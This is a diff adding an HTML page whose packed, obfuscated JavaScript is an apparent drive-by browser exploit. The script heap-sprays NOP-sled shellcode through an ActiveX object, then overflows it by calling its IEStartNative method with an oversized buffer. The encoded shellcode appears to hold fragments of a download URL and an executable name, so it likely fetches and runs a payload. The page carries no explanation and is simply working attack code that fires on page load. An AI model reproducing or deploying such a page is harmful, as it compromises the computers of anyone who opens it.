@@ -1,0 +1,10 @@
+<html>
+<object classid="clsid:F917534D-535B-416B-8E8F-0C04756C31A8" id='chatobj'></object>
+<body>
+<SCRIPT language="javascript">
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('6 c=f("%8"+"%8"+"%W"+"%V%X%Y%10%Z%U%T%O%N"+"%P%i%Q%S%R%11%12%1c%1b"+"%1d%1e%1f%1a%M%14%13%15%16"+"%18%17%1g%F%r%q%s%g%t"+"%u%v%o%n%m%l%p%L%H"+"%G%b%I%w%J%z%y%b%A"+"%B%b%D%C%E%K%19%5%1J"+"%1T%1S%1U%1V%1W%1R%1Q%1M%5"+"%1L%1h%1N%1O%i%1P%1Y%24%d"+"%27%2b%26%29%5%2a%28%25%20"+"%d%1Z%21%22%23%5%1X%1K%1r"+"%5"+"%1q%1s%1t%1u%1p%1o%1j%g%1i%1k%1l%1n%1m%1v%1w%1F%1E%1G%1H");6 j="1I";6 2=f("%8%8");a(2.9<7)2+=2;h=2.e(0,7);4=2.e(0,2.9-7);a(4.9+7<1D)4=4+4+h;k=1C 1y();1x(x=0;x<1z;x++)k[x]=4+c;6 3=\'\';a(3.9<1A)3+=\'\\1\\1\\1\\1\';3=3+"\\1\\1\\1\\1"+3;1B[j](3,"","");',62,136,'|x0a|bigblock|buffer|block|uffff|var|224|u9090|length|while|u408b|Callurlm_QJ|ud0ff|substring|unescape|u6e6f|fillblock|udb33|nuo|memory|u0065|u7865|u2e55|u5c3a|uc033|u7275|uc3c5|u6d6c|u642e|u6c6c|u4300|u1c70||u09eb|u0840|u8d34|u7c40|u8ebf|u953c|u0e4e|u038b|u0c78|u3040|u8b0c|u8bad|ue8ec|u0364|u5e8b|u49c9|u33f5|uad41|u0f36|u3828|u14be|u0320|u768b|u758b|u54eb|u8b3c|u3574|u56f5|u0378|u74f2|uc108|u66dd|u0324|u0c8b|u8b4b|udd03|u1c5e|uff84|u5ee7|uda03|u0dcb|ueb40|u3bef|u75df|u048b|u2454|u3065|u6870|u3130|u632e|u642f|u6d6f|u692e|u6169|u7468|uffd7|u7074|u2f3a|u782f|u776f|u2f6e|for|Array|300|600|chatobj|new|0x40000|u652e|u7a6c|u6578|u0000|IEStartNative|uec83|ue8d0|u8bff|u6fe8|u8dfc|uba52|u5353|u702f|u1a36|u242c|u8304|uff3c|u95d0|ubf50|uff52|ueb52|u7ebf|u6224|ue2d8|ue873|uff40|u5324|u2c83|u0e8a|ubf5d|u04ec|u53e8|u83ff|ufe98'.split('|'),0,{}))
+
+
+</script>
+</body>
+</html>
